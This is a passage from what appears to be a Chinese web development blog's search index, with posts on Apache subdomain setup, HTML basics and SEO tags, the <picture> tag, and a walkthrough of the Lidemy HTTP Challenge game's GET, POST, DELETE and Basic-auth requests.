不太懂的話，參考下面的圖片：","link":"/2021/12/13/how-to-send-a-pull-request/"},{"title":"四種發 request 的方法","text":"簡單記一下。 目前知道的四種 &lt;script src=\"...\"&gt; =&gt; 例如 google analyze 分析使用者行為 &lt;link href=\"....\"&gt; =&gt; 我目前也不知道怎麼應用 &lt;img src=\"...\"&gt; =&gt; Email，對方打開你的信了嗎？是誰打開你的信的？ &lt;form action=\"...\"&gt; =&gt; GET 想要的資料，POST 要給後端的資料","link":"/2022/01/06/how-to-send-request/"},{"title":"怎麼設定子網域？","text":"紀錄一下。 簡述在交怎麼設之前，先介紹一下什麼「子網域」和「子目錄」的差別： http://peanu.tw/message-board 這種透過 /資料夾 的網址就叫做子目錄。 http://message-board.peanu.tw 這種在 peanu 前面加上 message-board 的網址就叫做子網域。 至於這兩種有什麼差？可以參考這篇：子網域好還是子目錄好？架設部落格、新網站必備評估 另外再補充一下，關於「網址的層級」，可以先參考這張圖： 看網址的順序要「由後往前看」，以 http://message-board.peanu.tw 來說： tw 是第一層網域名稱，可替換成 org com 之類的 peanu 是第二層網域名稱，就是你買網域的時候自己挑的部分 message-board 是子網域 http 代表 HTTP 這個協定 OK，有這個基礎知識後就可以來談要怎麼設定了。 要設定子網域得做兩件事： 去虛擬主機（我是 Ubuntu）修改 Apache Vitural Host 的內容 去買網域的地方重新設定 修改 Apache Vitural Host連到你的主機後，先移動到這個地方，裡面會放 vitural host 的設定檔： 1cd /etc/apache2/sites-available/ 用 ls 後會看到 000-default.conf，這個是預設的設定檔。我們要拿它來寫一份新的，所以複製一份並命名為 message-board.conf： 1sudo copy 000-default.conf message-board.conf 接著打開設定檔來修改： 附註：nano 是一個 Unix 系統的文字編輯器 1sudo nano message-board.conf 打開來會像這樣： 我一開始打開也想說這啥？vim 的突變種？ 但仔細看會發現幾乎都是 ^ 開頭，而 ^ 代表 Ctrl 鍵，所以 ^G = Ctrl + G ，這樣應該會用了吧？ 接下來要設定的地方只有兩個： ServerName &lt;你想要的網址&gt; DocumentRoot &lt;網址對應到的路徑&gt; 不太懂得話你就參考上面的圖片，抄它的內容就好了。 改完以後記得存檔，然後要輸入一段指令來啟用它： 1sudo a2ensite restaurant.conf 看到回傳 Enabling site message-board. 就代表成功了。 設定完後要重新啟動 Apache2： 1sudo service apache2 restart Apache 的部分到這邊就 OK 囉。 重新設定網域我的網域是在 gandi 買的，所以這邊拿它來說明。 按下新增紀錄 設定內容 名稱的部分就是「子網域」，主機名稱則是「網域名稱」（記得結尾要加上 .） 按下建立後就成功了。接著就能用 http://message-board.peanu.tw 來連囉。 最後補一段設定時碰到的錯誤在重新啟動 Apache2 時噴了一段錯誤： 12Job for apache2.service failed.See \"systemctl status apache2.service\" and \"journalctl -xe\" for details. 它跟你說重啟失敗，要你執行 systemctl status apache2.service 來檢查看看，所以照做： 1234567891011121314● apache2.service - The Apache HTTP Server Loaded: loaded (/lib/systemd/system/apache2.service; enabled; vendor preset: enabled) Active: failed (Result: exit-code) since Tue 2022-03-08 09:14:24 UTC; 1min 3s ago Docs: https://httpd.apache.org/docs/2.4/ Process: 50421 ExecStart=/usr/sbin/apachectl start (code=exited, status=1/FAILURE)Mar 08 09:14:24 ip-172-31-95-126 systemd[1]: Starting The Apache HTTP Server...Mar 08 09:14:24 ip-172-31-95-126 apachectl[50424]: AH00526: Syntax error on line 12 of /etc/apache2/sites-enabled/message-board.con&gt;Mar 08 09:14:24 ip-172-31-95-126 apachectl[50424]: Invalid command 'ServerName:', perhaps misspelled or defined by a module not inc&gt;Mar 08 09:14:24 ip-172-31-95-126 apachectl[50421]: Action 'start' failed.Mar 08 09:14:24 ip-172-31-95-126 apachectl[50421]: The Apache error log may have more information.Mar 08 09:14:24 ip-172-31-95-126 systemd[1]: apache2.service: Control process exited, code=exited, status=1/FAILUREMar 08 09:14:24 ip-172-31-95-126 systemd[1]: apache2.service: Failed with result 'exit-code'.Mar 08 09:14:24 ip-172-31-95-126 systemd[1]: Failed to start The Apache HTTP Server. 雖然東西有點多，但仔細看會看到幾個關鍵字： Syntax error on line 12 of /etc/apache2/sites-enabled/message-board.con&gt; Invalid command 'ServerName:', perhaps misspelled or defined by a module not inc&gt; 好，答案很明顯了。多了一個「冒號」而產生的語法錯誤，所以拿掉後再重新啟動就正常了。","link":"/2022/03/08/how-to-set-subdomain/"},{"title":"HTML 基礎","text":"要簡單很簡單，要複雜也可以很複雜。 HTML 架構 &lt;!DOCTYPE html&gt; =&gt; 宣告我用的是 HTML5 這個格式 html =&gt; 整個 HTML 文件的根元素 head =&gt; 放一些額外資訊。像是編碼格式，外部檔案之類的 title =&gt; 網頁的標題 body =&gt; 網頁的主要內容 成對與不成對的標籤大部分的 HTML 標籤都會以成對出現，例如 &lt;h1&gt;title&lt;/h1&gt;、&lt;p&gt;hahahaha&lt;/p&gt;。 但有些標籤是沒有內容的，像是 &lt;meta charset=\"utf-8\" /&gt; ，所以就改成在後面加上 / 可以想成是「自己一組」的這種概念。 HTML 一開始的用途用來呈現「文章」的感覺，所以一開始最基本的標籤是 &lt;h1&gt;~&lt;h6&gt; 跟 &lt;p&gt;，這兩種標籤其實就大約是一篇文章的結構了，分別是「標題」跟「內文」。 把標籤給分組起來，&lt;div&gt; 與 &lt;span&gt; 兩個都是用來做「分組」這件事情，主要是在 CSS 的時候會用到： 1234567891011121314151617181920&lt;!-- 第一組 --&gt;&lt;div&gt; &lt;h2&gt;Group1&lt;/h2&gt; &lt;p&gt; Lorem ipsum, dolor sit amet consectetur adipisicing elit. Ipsam quidem consectetur ratione doloribus ullam iusto neque iure, ea aliquam iste a quod reiciendis nam labore? Quam aperiam numquam totam sapiente? &lt;/p&gt;&lt;/div&gt;&lt;!-- 第二組 --&gt;&lt;div&gt; &lt;h2&gt;Group2&lt;/h2&gt; &lt;p&gt; Lorem ipsum, dolor sit amet consectetur adipisicing elit. Ipsam quidem consectetur ratione doloribus ullam iusto neque iure, ea aliquam iste a quod reiciendis nam labore? Quam aperiam numquam totam sapiente? &lt;/p&gt;&lt;/div&gt; &lt;span&gt; 也是分組，跟 &lt;div&gt; 最大的差別在於不會換行，可以把它想成是「可以與別人共處，但在組裡還有自己的小圈圈」這種感覺： 1234567891011121314151617181920 &lt;!-- 第一組 --&gt;&lt;div&gt; &lt;h2&gt;Group1&lt;/h2&gt; &lt;p&gt; Lorem ipsum, dolor sit &lt;span&gt;我是第一組裡面的小圈子&lt;span&gt; consectetur adipisicing elit. Ipsam quidem consectetur ratione doloribus ullam iusto neque iure, ea aliquam iste a quod reiciendis nam labore? Quam aperiam numquam totam sapiente? &lt;/p&gt;&lt;/div&gt;&lt;!-- 第二組 --&gt;&lt;div&gt; &lt;h2&gt;Group2&lt;/h2&gt; &lt;p&gt; Lorem ipsum, dolor sit amet consectetur adipisicing elit. Ipsam quidem consectetur &lt;span&gt;我是第二組裡面的小圈子&lt;span&gt; doloribus ullam iusto neque iure,ea aliquam iste a quod reiciendis nam labore? Quam aperiam numquamtotam sapiente? &lt;/p&gt;&lt;/div&gt; 顯示圖片的標籤 &lt;img&gt;用 &lt;img&gt; 這個標籤，不過不是這樣寫： 1&lt;img&gt;https://xxxx&lt;/img&gt; 通常會放在標籤裡的內容是指「直接顯示在網頁上」的東西。例如說 &lt;h2&gt;Title&lt;/h2&gt; 會在網頁上顯示 「Title」。 但是圖片的內容是一個連結，不是我們真正想呈現的東西，所以正確的用法是這樣： 1&lt;img src=\"https://xxx\" /&gt; 要用 src 來告訴網頁圖片的連結在哪裡。 title 屬性1&lt;img src=\"https://xxx\" title=\"yoyoyo\"&gt; 代表圖片的標題，當滑鼠停在圖片上的時候，會顯示訊息。 alt 屬性alt 的全文是 alternative（替代），當圖片沒辦法顯示的時候，就會顯示設定在 alt 中的替代文字。 1&lt;img src=\"https://xxx\" alt=\"你怎麼帥成這樣\"&gt; 顯示清單&lt;ul&gt;（unordered list） 無序清單代表沒有先後順序的清單： 12345&lt;ul&gt; &lt;li&gt;yoyo&lt;/li&gt; &lt;li&gt;yoyo&lt;/li&gt; &lt;li&gt;yoyo&lt;/li&gt;&lt;ul&gt; &lt;ol&gt;（ordered list） 有序清單代表有先後順序的清單： 12345&lt;ol&gt; &lt;li&gt;yoyo&lt;/li&gt; &lt;li&gt;yoyo&lt;/li&gt; &lt;li&gt;yoyo&lt;/li&gt;&lt;ol&gt; 保留完整格式 &lt;pre&gt; 與換行 &lt;br&gt;&lt;pre&gt; preformatted text在標籤內的「換行」、「空白」不管有幾個都會被解析成「一個空白」，所以可能會跟你在編輯器裡面打的格式不一樣： 1&lt;p&gt; 我 就 要 空 一 大 格 &lt;/p&gt; pre 可以幫你把文字格式化，保留原本的格式： 1&lt;pre&gt; 我 就 要 空 一 大 格 &lt;/pre&gt; &lt;br&gt; line break因為剛剛說「換行」也會被解析成「一個空白」，所以真的想換行的時候可以用 &lt;br /&gt;： 1234&lt;p&gt; 第一行 &lt;br /&gt; 下一行&lt;p&gt; 顯示表格 &lt;table&gt;最常用的幾個： &lt;table&gt; =&gt; 整個表格 &lt;caption&gt; =&gt; 整個表格的標題 &lt;tr&gt; =&gt; table row 表格的行 &lt;td&gt; =&gt; table cell 表格的列 &lt;th&gt; =&gt; table header 欄位標題 123456789101112131415161718192021222324252627&lt;table&gt; &lt;caption&gt;一年 A 班&lt;/caption&gt; &lt;!-- 第一行（標題） --&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;英文&lt;/th&gt; &lt;th&gt;國文&lt;/th&gt; &lt;/tr&gt; &lt;!-- 第二行 --&gt; &lt;tr&gt; &lt;td&gt;小明&lt;/td&gt; &lt;td&gt;80&lt;/td&gt; &lt;td&gt;90&lt;/td&gt; &lt;/tr&gt; &lt;!-- 第三行 --&gt; &lt;tr&gt; &lt;td&gt;小花&lt;/td&gt; &lt;td&gt;10&lt;/td&gt; &lt;td&gt;30&lt;/td&gt; &lt;/tr&gt; &lt;!-- 第四行 --&gt; &lt;tr&gt; &lt;td&gt;小邱&lt;/td&gt; &lt;td&gt;48763&lt;/td&gt; &lt;td&gt;66666&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 帶你環遊世界 &lt;a&gt;&lt;a&gt; anchor，錨點。比喻的是從船上拋出去的那個錨，在網頁的世界代表「超連結」，分成兩種： 連到網頁「外面」的連結 連到網頁「裡面」的連結 另外要搭配 href （hyper text reference）屬性來使用，用來設置連結的位置。 連到網頁外面的連結1&lt;a href=\"https://google.com\"&gt;take me to google&lt;/a&gt; 另外還有一個屬性：target，可以用來設定要直接連到新頁面，還是用分頁來開啟： 12&lt;a href=\"https://google.com\" target=\"_self\"&gt;直接開啟&lt;/a&gt;&lt;a href=\"https://google.com\" target=\"_blank\"&gt;開新分頁&lt;/a&gt; 連到網頁裡面的連結首先要在標籤加上 id 屬性，這樣 href 才可以有「參考點」，知道要把你帶到哪個位置： 123456&lt;!-- 用法是 # + id 值 --&gt;&lt;a href=\"#res1\"&gt;帶我到餐廳1&lt;a/&gt;.........&lt;h2 id=\"res1\"&gt;餐廳1&lt;/h2&gt; 語意化標籤 Semantic elements這些元素在渲染後的畫面上看起來都跟 &lt;div&gt; 沒有區別。最主要的用意是要讓人（工程師）或機器（搜尋引擎）在讀 HTML 的時候可以比較清楚一點，因為有「語意」。就跟看到 &lt;h1&gt; 知道是標題，看到 &lt;p&gt; 知道是內文，這個就是有語意的標籤。 &lt;main&gt; 最主要的內容，一個網頁只會有一個。 &lt;header&gt; 作為往開場介紹的內容，可以是 logo 或導讀網頁的內容 &lt;footer&gt; 通常是 copyright 或作者資訊等等 &lt;article&gt; 一個段落，重點是要能夠「獨立」存在，不相依其他內容 &lt;section&gt; 一個段落，可以「內嵌」在 &lt;article&gt; 裡，通常要有「標題」 更多的語意標籤可以參考： W3C MDN 直接用別人的網頁 &lt;iframe&gt;如題，可以使用 src 來嵌入別人的網頁： 1&lt;iframe src=\"https://jubeatt.github.io/\" width=\"80%\" height=\"500px\" style=\"display: block; margin: auto;\"&gt;&lt;/iframe&gt; 備註：屬於 replace element 的一種，所以可以設定寬高。 備註：可以把 replace element 想成是「內容是從外面嵌入的」會比較好理解，例如像 &lt;img&gt;、&lt;iframe&gt;、&lt;textarea&gt; 等等。 上有政策 下有對策為了避免人家把你的網站拿去亂用，server 可以設定一個 header：x-frame-options: SAMEORIGIN。加了這個後別人就沒辦法用 &lt;iframe&gt; 來偷你的網站來用： 表單相關標籤&lt;input&gt; 相關text =&gt; 輸入文字password =&gt; 輸入密碼，自動馬賽克email =&gt; 瀏覽器會自動做驗證，手機上的鍵盤會自動添加 @、.com 的按鈕tel =&gt; 不像 email 會自動驗證，但是手機上的 UX 會比較好（鍵盤）date =&gt; 輸入日期radio =&gt; 單選框checkbox =&gt; 複選框submit =&gt; 送出表單 其他&lt;label&gt; =&gt; 把文字跟 input 標籤關聯起來&lt;select&gt; =&gt; 下拉式選單&lt;button&gt; =&gt; 按鈕（在表單外也能使用，只是也可用在表單） 1234567891011121314151617&lt;form method=\"GET\" action=\"https://a.com\"&gt; &lt;div&gt; &lt;select name=\"interesting\"&gt; &lt;option value=\"吃飯\"&gt;吃飯&lt;/option&gt; &lt;option value=\"看電影\"&gt;看電影&lt;/option&gt; &lt;option value=\"睡覺\"&gt;睡覺&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div&gt; &lt;input type=\"checkbox\" name=\"time\" value=\"早上\" id=\"早上\"&gt;&lt;label for=\"早上\"&gt;早上&lt;/label&gt; &lt;input type=\"checkbox\" name=\"time\" value=\"中午\" id=\"中午\"&gt;&lt;label for=\"中午\"&gt;中午&lt;/label&gt; &lt;input type=\"checkbox\" name=\"time\" value=\"晚上\" id=\"晚上\"&gt;&lt;label for=\"晚上\"&gt;晚上&lt;/label&gt; &lt;/div&gt; &lt;div&gt; &lt;input type=\"submit\" value=\"送出\"&gt; &lt;/div&gt;&lt;/form&gt; 備註：name 跟 value 一定要附上，這會對應到 server 收到表單後的 key 跟 value，沒有的話 server 就不知道內容是什麼。 更多 input 種類：MDN SEOSearch Engine Optimization 搜尋引擎優化，幫助搜尋引擎（dock yahoo bing）理解你的網頁在說什麼。 主動告訴「搜尋引擎」你的網頁在做什麼，會更好。 &lt;meta&gt; 標籤最常見的就是 keyword 跟 description： 12&lt;meta name=\"keyword\" content=\"搜尋關鍵字\"&gt;&lt;meat name=\"description\" content=\"網站的簡介\"&gt; Open Graph ProtocolFacebook 提出的協議，遵循這個協議就可以讓網頁被分享到社群網站（臉書）上的時候比較亮眼，像是縮圖、標題、描述等等。 12345&lt;meta property=\"og:title\" content=\"網站標題\"&gt;&lt;meta property=\"og:description\" content=\"介紹\"&gt;&lt;meta property=\"og:image\" content=\"https://xxx.com\"&gt;&lt;meta property=\"og:image:width\" content=\"500\"&gt;&lt;meta property=\"og:image:height\" content=\"400\"&gt; 可以用 這個網站 來查看 og 標籤的設定效果。 更多詳細可以參考 這個網站，寫得蠻簡潔的。 JSON-ldJSON-ld，全名是 JSON for Linking Data，主要是給 google 看的。 跟 Open Graph Protocol 概念差不多，就是用「特定格式」來呈現資料，讓機器跟人比較好閱讀。 123456789&lt;script type=\"application/ld+json\"&gt;{ \"@context\": \"https://json-ld.org/contexts/person.jsonld\", \"@id\": \"http://dbpedia.org/resource/John_Lennon\", \"name\": \"John Lennon\", \"born\": \"1940-10-09\", \"spouse\": \"http://dbpedia.org/resource/Cynthia_Lennon\"}&lt;/script&gt; 附上幾個參考網站： 官方網站 Google 開發者文件 介紹文章 robots.txt給「網頁爬蟲」看的檔案，參考這裡。 其中 Disallow 是告訴爬蟲「不要爬這些檔案」，Allow 則是「爬這些檔案」。 Sitemap 則是把網站中的所有連結直接附給爬蟲，讓它們能更快找到有用的資訊。 APP 相關資訊效果就是跳一個視窗問你要不要下載 APP？或是有安裝的話會直接跳到 APP 裡： 12&lt;meta property=\"al:ios:app_name\" content=\"app名稱\"&gt;&lt;meta property=\"al:ios:app_store_id\" content=\"app的id\"&gt; 跟 twitter 有關，用 twitter 瀏覽會有比較好的效果： 12&lt;meta property=\"twitter:app:id:ipad\" name=\"twitter:app:id:ipad\" content=\"284876795\"&gt;&lt;meta property=\"twitter:app:id:iphone\" name=\"twitter:app:id:iphone\" content=\"284876795\"&gt;","link":"/2022/01/11/html-basic/"},{"title":"使用 <picture> 來設定 RWD 圖片","text":"好用的標籤。 方便之處在製作 RWD 的時可能會針對不同寬度的裝置來提供不同尺寸的圖片。除了用 media query 或 JavaScript 之外，還可以利用 &lt;picture&gt; 來實現： 123456789&lt;picture&gt; &lt;!-- 768px 以上要顯示的圖片 --&gt; &lt;source srcset=\"images/desktop/image-transform.jpg\" media=\"(min-width: 760px)\" /&gt; &lt;!-- 不支援 picture 標籤，或不符合上面的條件時套用 --&gt; &lt;img src=\"images/mobile/image-transform.jpg\" /&gt;&lt;/picture&gt; 瀏覽器會先從 &lt;source&gt; 找出匹配圖片，如果沒有（或瀏覽器不支援 &lt;picture&gt;）就會使用 &lt;img&gt; 裡的圖片。 備註： &lt;source&gt; 可以有多個 &lt;img&gt; 一定要寫在最後面，因為出現在 &lt;img&gt; 後的 &lt;source&gt; 都會被省略","link":"/2022/01/16/html-picture-tag/"},{"title":"HTTP Challenge 攻略與心得","text":"來自 Lidemy 上的小遊戲：Lidemy HTTP Challenge，寫一篇簡短的攻略文與心得。 這份遊戲其實能學到蠻多東西的，很推薦沒玩過的人可以去玩玩看。 第一關1. 開場一開始的 token 為 {GOGOGO}，發一個 GET 請求就 OK 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv1?token={GOGOGO}',(err, res, body) =&gt; { console.log(body) } response： 12345678啊...好久沒有看到年輕人到我這個圖書館了，我叫做 lib，是這個圖書館的管理員很開心看到有年輕人願意來幫忙，最近圖書館剛換了資訊系統，我都搞不清楚怎麼用了...這是他們提供給我的文件，我一個字都看不懂，但對你可能會有幫助：https://gist.github.com/aszx87410/3873b3d9cbb28cb6fcbb85bf493b63ba先把這文件放一旁吧，這個待會才會用到你叫做什麼名字呢？用 GET 方法跟我說你的 name 叫做什麼吧！除了 token 以外順便把 name 一起帶上來就可以了 2. 自我介紹記得把剛剛的 API 網址給記下來，之後會用到。 接著就依照題目說的，帶上 &amp;name=xxx 就可以了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv1?token={GOGOGO}&amp;name=PeaNu',(err, res, body) =&gt; { console.log(body)}) response： 1啊...原來你叫 PeaNu 啊！下一關的 token 是 {HellOWOrld} 第一關就到這邊結束，進到下一關囉。 第二關1. 開場利用第一關給的 token：{HellOWOrld}，發一個 GET 請求就 OK 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv2?token={HellOWOrld}',(err, res, body) =&gt; { console.log(body)}) response： 1234我前陣子在整理書籍的時候看到了一本我很喜歡的書，可是現在卻怎麼想都想不起來是哪一本...我只記得那本書的 id 是兩位數，介於 54~58 之間，你可以幫幫我嗎？找到是哪一本之後把書的 id 用 GET 傳給我就行了。 2. 輸入正確的 id接下來要用 &amp;id=54~58 發出 GET 請求，其中會有一個是正確的 id，也就是 56： 1234request('https://lidemy-http-challenge.herokuapp.com/lv2?token={HellOWOrld}&amp;id=56',(err, res, body) =&gt; { console.log(body)}) response： 1啊！就是這本書，太謝謝你了。下一關的 token 為：{5566NO1} 一樣順利拿到 token，進到下一關！ 備註：試著用第一關給的 API，去查詢 id=56 的書，會發現管理員在找的書為「5566 - 認真」，正好對應了 {5566NO1}。 第三關1. 開場利用第二關給的 token：{5566NO1}，發一個 GET 請求就 OK 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv3?token={5566NO1}',(err, res, body) =&gt; { console.log(body)}) response： 12345678真是太感謝你幫我找到這本書了！剛剛在你找書的時候有一批新的書籍送來了，是這次圖書館根據讀者的推薦買的新書，其中有一本我特別喜歡，想要優先上架。書名是《大腦喜歡這樣學》，ISBN 為 9789863594475。就拜託你了。新增完之後幫我把書籍的 id 用 GET 告訴我。 2. 新增書籍這時候就要用到剛剛的 API 了，請閱讀裡面的說明，然後用 POST 把書新增到圖書系統裡： 123456789101112131415const API_ENDPOINT_V1 = 'https://lidemy-http-challenge.herokuapp.com/api'request({ method: 'POST', url: `${API_ENDPOINT_V1}/books`, headers: { 'Content-type': 'application/x-www-form-urlencoded' }, form: { name: '《大腦喜歡這樣學》', ISBN: 9789863594475 }},(err, res, body) =&gt; { console.log(body)}) 我們要用「form 表單」的格式來傳送，所以在 header 加上 'Content-type': 'application/x-www-form-urlencoded' response： 1{\"message\":\"新增成功\",\"id\":\"1989\"} 接著把取得的 id 加上去就可以了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv3?token={5566NO1}&amp;id=1989',(err, res, body) =&gt; { console.log(body)}) response： 1這樣子讀者就能趕快看到這本新書了，謝謝！下一關的 token 為 {LEarnHOWtoLeArn} 第四關1. 開場利用第三關給的 token：{LEarnHOWtoLeArn}，發一個 GET 請求就 OK 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv4?token={LEarnHOWtoLeArn}',(err, res, body) =&gt; { console.log(body)}) response： 1234我翻了一下你之前幫我找的那本書，發現我記錯了...這不是我朝思暮想的那一本。我之前跟你講的線索好像都是錯的，我記到別本書去了，真是抱歉啊。我記得我想找的那本書，書名有：「世界」兩字，而且是村上春樹寫的，可以幫我找到書的 id 並傳給我嗎？ 2. 找出書本的 id這邊有兩種方法，一種是在 API 上加上參數，一種是把整筆抓下來後自己找。先示範第一種： 123456789101112/* 把 API 加上 quest string 這邊要自己把「世界」做 url encode，不然會失敗。 */const API_ENDPOINT_V1 = 'https://lidemy-http-challenge.herokuapp.com/api'request({ method: 'GET', url: `${API_ENDPOINT_V1}/books?q=%E4%B8%96%E7%95%8C`,},(err, res, body) =&gt; { console.log(JSON.parse(body))}) response： 1234567891011[ { id: 2, name: '當我想你時，全世界都救不了我', author: '肆一', ISBN: '5549173495' }, { id: 27, name: '從你的全世界路過', author: '張嘉佳', ISBN: '8426216529' }, { id: 79, name: '世界末日與冷酷異境', author: '村上春樹', ISBN: '9571313408' }, { id: 90, name: '文學的40堂公開課：從神話到當代暢銷書，文學如何影響我們、帶領我們理解這個世界', author: '約翰．薩德蘭', ISBN: '7978376866' }] 第二種，整筆抓下來再搜尋： 1234567891011const API_ENDPOINT_V1 = 'https://lidemy-http-challenge.herokuapp.com/api'request({ method: 'GET', url: `${API_ENDPOINT_V1}/books`,},(err, res, body) =&gt; { const books = JSON.parse(body) // 搜尋書名為「世界」與作者為「村上春樹」的書 target = books.filter(elem =&gt; elem.author === '村上春樹' &amp;&amp; elem.name.includes('世界') ) console.log(target)}) response： 1[ { id: 79, name: '世界末日與冷酷異境', author: '村上春樹', ISBN: '9571313408' } ] 所以最後拿 id=79 去發請求就行囉： 1234request('https://lidemy-http-challenge.herokuapp.com/lv4?token={LEarnHOWtoLeArn}&amp;id=79',(err, res, body) =&gt; { console.log(body)}) response： 1沒錯！這次我很確定了，就是這本！下一關的 token 為 {HarukiMurakami} 第四關結束，進入下一關。 備註：token：{HarukiMurakami} 就是村上春樹的名字。 第五關1. 開場利用第四關給的 token：{HarukiMurakami}，發一個 GET 請求就 OK 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv5?token={HarukiMurakami}',(err, res, body) =&gt; { console.log(body)}) response： 1234昨天有個人匆匆忙忙跑過來說他不小心捐錯書了，想要來問可不可以把書拿回去。跟他溝通過後，我就把他捐過來的書還他了，所以現在要把這本書從系統裡面刪掉才行。那本書的 id 是 23，你可以幫我刪掉嗎？ 2. 刪除書本按照題目說的，用 DELETE 請求去把 id 是 23 的書給刪除： 12345678const API_ENDPOINT_V1 = 'https://lidemy-http-challenge.herokuapp.com/api'request({ method: 'DELETE', url: `${API_ENDPOINT_V1}/books/23`,},(err, res, body) =&gt; { console.log(body)}) response： 1{\"message\":\"\\n咦...是刪掉了沒錯，但總覺得哪裡怪怪的，算了，先這樣吧！下一關的 token 為 {CHICKENCUTLET}\\n\"} 第五關結束，進入下一關。 備註：被刪除的書 其實是雞排妹的寫真集，所以 token 才叫做 {CHICKENCUTLET}（雞排）。 第六關1. 開場利用第五關給的 token：{CHICKENCUTLET}，發一個 GET 請求就 OK 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv6?token={CHICKENCUTLET}',(err, res, body) =&gt; { console.log(body)}) response： 1234567891011我終於知道上次哪裡怪怪的了！照理來說要進入系統應該要先登入才對，怎麼沒有登入就可以新增刪除...這太奇怪了，我已經回報給那邊的工程師了，他們給了我一份新的文件：https://gist.github.com/aszx87410/1e5e5105c1c35197f55c485a88b0328a。這邊是帳號密碼，你先登入試試看吧，可以呼叫一個 /me 的 endpoint，裡面會給你一個 email。把 email 放在 query string 上面帶過來，我看看是不是對的。帳號：admin密碼：admin123 2. 取得使用者資訊這邊先參考新的 API 文件說明，裡面提到的驗證其實就是 HTTP 中的「Basic Authentication」，詳細可以參考 這篇文章。 所以這邊得依照格式把 admin:admin123 做 「base64」編碼，再帶上 Authorization 的 header： 12345678910const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'// 以 base64 編碼const encode = Buffer.from('admin:admin123').toString('base64')request({ url: `${API_ENDPOINT_V2}/me`, // 帶上驗證 header headers: { 'Authorization': `Basic ${encode}` }}, (err, res, body) =&gt; console.log(body)) 備註：關於 Buffer 的用法可以參考 Node 中的 buffer 模組 response： 1{\"username\":\"admin\",\"email\":\"lib@lidemy.com\"} 最後把 email 帶到參數裡這關就 pass 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv6?token={CHICKENCUTLET}&amp;email=lib@lidemy.com',(err, res, body) =&gt; { console.log(body)}) response： 1對對對，就是這個，這樣才對嘛！下一關的 token 為 {SECurityIsImPORTant} 備註：{SECurityIsImPORTant} = 安全性很重要。 第七關1. 開場利用第六關給的 token：{SECurityIsImPORTant}，發一個 GET 請求就 OK 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv7?token={SECurityIsImPORTant}',(err, res, body) =&gt; { console.log(body)}) response： 1234567那邊的工程師說系統整個修復完成了，剛好昨天我們發現有一本書被偷走了...這本書我們已經買第五次了，每次都被偷走，看來這本書很熱門啊。我們要把這本書從系統裡面刪掉，就拜託你了。對了！記得要用新的系統喔，舊的已經完全廢棄不用了。書的 id 是 89 2. 刪除書本就是用 DELETE 去把書本刪掉而已： 12345678const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'request({ method: 'DELETE', url: `${API_ENDPOINT_V2}/books/89`, headers: { 'Authorization': 'Basic YWRtaW46YWRtaW4xMjM=' }}, (err, res, body) =&gt; console.log(body)) 1{\"message\":\"\\n希望下一次進這本書的時候不會再被偷走了。下一關的 token 為 {HsifnAerok}\\n\"} 順利進到下一關。 備註：這本被偷走的書其實是「跟著月亮走：韓國瑜的夜襲精神與奮進人生」，所以把 {HsifnAerok} 倒過來就會發現是 {koreAnfisH}（韓國魚） 1{\"id\":89,\"name\":\"跟著月亮走：韓國瑜的夜襲精神與奮進人生\",\"author\":\"韓國瑜\",\"ISBN\":\"9789571376882\"} 第八關1. 開場利用第七關給的 token：{HsifnAerok}，發一個 GET 請求就 OK 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv8?token={HsifnAerok}',(err, res, body) =&gt; { console.log(body)}) response： 123456我昨天在整理書籍的時候發現有一本書的 ISBN 編號跟系統內的對不上，仔細看了一下發現我當時輸入系統時 key 錯了。哎呀，人老了就是這樣，老是會看錯。那本書的名字裡面有個「我」，作者的名字是四個字，key 錯的 ISBN 最後一碼為 7，只要把最後一碼改成 3 就行了。對了！記得要用新的系統喔，舊的已經完全廢棄不用了。 2. 找出填錯資訊的書本這邊一樣可以用 API 參數來找，或者是整筆抓下來再搜尋。先示範第一種： 123456789const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'const encode = Buffer.from('admin:admin123').toString('base64')request({ // 搜尋「我」，記得一樣要做 url encode url: `${API_ENDPOINT_V2}/books?q=%E6%88%91`, headers: { 'Authorization': `Basic ${encode}` }}, (err, res, body) =&gt; console.log(JSON.parse(body))) response： 1234567891011121314151617181920212223242526272829303132333435[ { id: 2, name: '當我想你時，全世界都救不了我', author: '肆一', ISBN: '5549173495' }, { id: 3, name: '我殺的人與殺我的人', author: '東山彰良', ISBN: '9262228645' }, { id: 7, name: '你已走遠，我還在練習道別', author: '渺渺', ISBN: '3722233689' }, { id: 9, name: '你是我最熟悉的陌生人', author: 'Middle', ISBN: '9765734253' }, { id: 22, name: '我輩中人：寫給中年人的情書', author: '張曼娟', ISBN: '7241428897' }, { id: 38, name: '我和我追逐的垃圾車', author: '謝子凡', ISBN: '7797349452' }, { id: 57, name: '我的櫻花戀人', author: '宇山佳佑', ISBN: '2947749939' }, { id: 60, name: '你走慢了我的時間', author: '張西', ISBN: '8811544334' }, { id: 66, name: '我是許涼涼', author: '李維菁', ISBN: '8389193464' }, { id: 72, name: '日日好日：茶道教我的幸福15味【電影書腰版】', author: '森下典子', ISBN: '9981835427' }, { id: 90, name: '文學的40堂公開課：從神話到當代暢銷書，文學如何影響我們、帶領我們理解這個世界', author: '約翰．薩德蘭', ISBN: '7978376866' }, { id: 95, name: '我想吃掉你的胰臟【電影珍藏版】', author: '住野夜', ISBN: '2615985356' }, { id: 100, name: '慢情書：我們會在更好的地方相遇嗎？', author: '林達陽', ISBN: '7418527246' }] （有蠻多筆符合的，所以抓下來後還是要再搜尋一下比較清楚） 第二種，整筆抓下來搜尋： 12345678910111213141516171819const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'request({ method: 'GET', url: `${API_ENDPOINT_V2}/books`, headers: { 'Authorization': 'Basic 